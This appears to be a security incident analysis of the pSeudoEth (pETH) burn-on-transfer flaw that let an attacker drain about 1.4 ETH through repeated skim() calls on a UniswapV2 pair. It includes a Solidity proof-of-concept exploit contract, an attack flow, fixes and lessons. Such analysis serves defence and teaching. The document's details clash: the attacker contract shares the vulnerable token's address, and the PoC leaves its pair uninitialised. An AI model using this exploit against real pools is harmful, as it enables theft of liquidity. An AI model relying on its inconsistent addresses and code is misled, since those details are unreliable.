# pSeudoEth Skim Arbitrage Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | pSeudoEth (pETH) |
| Date | 2023-10-31 |
| Chain | Ethereum Mainnet |
| Loss | ~1.4 ETH |
| Attack Type | Repeated Skim Arbitrage |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0xea75aec151f968b8de3789ca201a2a3a7faeefba` |
| Attack Contract | `0x2033b54b6789a963a02bfcbd40a46816770f1161` |
| Vulnerable Contract | `0x2033b54b6789a963a02bfcbd40a46816770f1161` (pETH) |
| Fork Block | 18,305,131 |

## 2. Vulnerable Code Analysis

pSeudoEth (pETH) is an ETH-based synthetic token. By repeatedly calling the `skim()` function on a UniswapV2-style pair, an attacker could exploit reserve imbalances for arbitrage. The attacker accumulated small amounts of ETH over 10 `skim()` calls per round, draining a total of 1.4 ETH.

```solidity
// Vulnerable pattern: repeated skim on pETH pair to manipulate reserves
contract pETHPair {
    // UniswapV2 style pair
    uint112 private reserve0; // pETH
    uint112 private reserve1; // WETH

    // skim: transfers the difference between actual balance and recorded reserve to caller
    function skim(address to) external lock {
        address _token0 = token0;
        address _token1 = token1;
        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)) - reserve0);
        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)) - reserve1);
    }
}

// Vulnerable: fee/tax mechanism on pETH transfer causes mismatch between received amount and recorded amount
contract pETH {
    uint256 public burnRate = 2; // 2% burned on transfer

    function _transfer(address from, address to, uint256 amount) internal {
        uint256 burnAmount = amount * burnRate / 100;
        uint256 receiveAmount = amount - burnAmount;
        _burn(from, burnAmount);
        super._transfer(from, to, receiveAmount);
        // pair records `amount` but actually receives `receiveAmount`
        // → reserve vs balanceOf mismatch → skim becomes possible
    }
}
```

**Vulnerability**: pETH's burn-on-transfer mechanism caused a discrepancy between the pair's recorded `reserve` and the actual `balanceOf`. The attacker repeatedly extracted this difference via `skim()` to generate profit.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root Cause: Repeated Skim Arbitrage
// Source code unverified — analysis based on bytecode
```

## 3. Attack Flow

```
Attacker [0xea75aec151f968b8de3789ca201a2a3a7faeefba]
  │
  ├─1─▶ Analyze pETH/WETH pair reserve state
  │      Confirm reserve0 (pETH) vs balanceOf(pair) mismatch
  │
  ├─2─▶ Repeated skim() calls (10 rounds):
  │      Round 1: Pair.skim(address(this)) → receive small amount of WETH
  │      Round 2: Swap WETH to pETH → skim() again
  │      Round 3~10: Repeat
  │      [pETH: 0x2033b54b6789a963a02bfcbd40a46816770f1161]
  │
  ├─3─▶ Accumulated profit per round:
  │      Burn mechanism causes reserve mismatch → skimmable amount generated
  │      10 iterations → total 1.4 ETH accumulated
  │
  └─4─▶ 1.4 ETH drained
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IUniswapV2Pair {
    function skim(address to) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function sync() external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

contract pSeudoEthExploit {
    IUniswapV2Pair pethPair;
    IERC20 pETH = IERC20(0x2033b54b6789a963a02bfcbd40a46816770f1161);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function testExploit() external {
        // Repeat skim 10 times
        for (uint i = 0; i < 10; i++) {
            _skimRound();
        }

        // Check final profit
        uint256 profit = WETH.balanceOf(address(this));
        // ~1.4 ETH
    }

    function _skimRound() internal {
        // Receive reserve mismatch amount via skim
        pethPair.skim(address(this));

        // Swap received pETH for WETH
        uint256 pethBal = pETH.balanceOf(address(this));
        if (pethBal > 0) {
            pETH.transfer(address(pethPair), pethBal);
            (uint112 r0, uint112 r1,) = pethPair.getReserves();
            address t0 = pethPair.token0();
            bool isPETHToken0 = (t0 == address(pETH));

            if (isPETHToken0) {
                uint256 wethOut = getAmountOut(pethBal, r0, r1);
                pethPair.swap(0, wethOut, address(this), "");
            } else {
                uint256 wethOut = getAmountOut(pethBal, r1, r0);
                pethPair.swap(wethOut, 0, address(this), "");
            }
        }
    }

    function getAmountOut(uint256 amIn, uint256 resIn, uint256 resOut)
        internal pure returns (uint256)
    {
        return (amIn * 997 * resOut) / (resIn * 1000 + amIn * 997);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | AMM reserve mismatch due to burn-on-transfer mechanism |
| Impact Scope | pETH/WETH UniswapV2 pair |
| Explorer | [Etherscan](https://etherscan.io/address/0x2033b54b6789a963a02bfcbd40a46816770f1161) |

## 6. Security Recommendations

```solidity
// Fix 1: fee-on-transfer tokens are incompatible with UniswapV2 — remove burn rate
// Decouple the fee-on-transfer mechanism from the pair entirely

// Fix 2: Exempt pair transfers from burn
mapping(address => bool) public exemptFromBurn;

constructor() {
    exemptFromBurn[uniswapPair] = true;
}

function _transfer(address from, address to, uint256 amount) internal override {
    if (exemptFromBurn[from] || exemptFromBurn[to]) {
        super._transfer(from, to, amount);
        return;
    }
    uint256 burnAmount = amount * burnRate / 100;
    _burn(from, burnAmount);
    super._transfer(from, to, amount - burnAmount);
}

// Fix 3: UniswapV2 Universal Router approach — check balance after transferFrom
function swap(uint256 amountIn, ...) external {
    uint256 balanceBefore = IERC20(tokenIn).balanceOf(address(pair));
    IERC20(tokenIn).transferFrom(msg.sender, address(pair), amountIn);
    uint256 actualReceived = IERC20(tokenIn).balanceOf(address(pair)) - balanceBefore;
    // Calculate using actualReceived (accounts for fee-on-transfer)
}
```

## 7. Lessons Learned

1. **Incompatibility between fee-on-transfer tokens and UniswapV2**: Tokens that burn or charge fees on transfer conflict with UniswapV2's `reserve` mechanism. The discrepancy between the actual balance and the recorded reserve becomes an attack surface for `skim()`.
2. **Repeated skim pattern**: Even small individual gains accumulate when `skim()` is called repeatedly. Fee-on-transfer tokens intended for AMM listing must be audited for this vulnerability in advance.
3. **Synthetic ETH token design**: Synthetic tokens that wrap ETH, like pETH, can introduce unexpected vulnerabilities during AMM integration when they deviate from standard ERC-20 behavior.
4. **Repeatability of small-scale attacks**: Although the loss was 1.4 ETH, the same pattern applied to larger liquidity pools could result in significantly greater damage.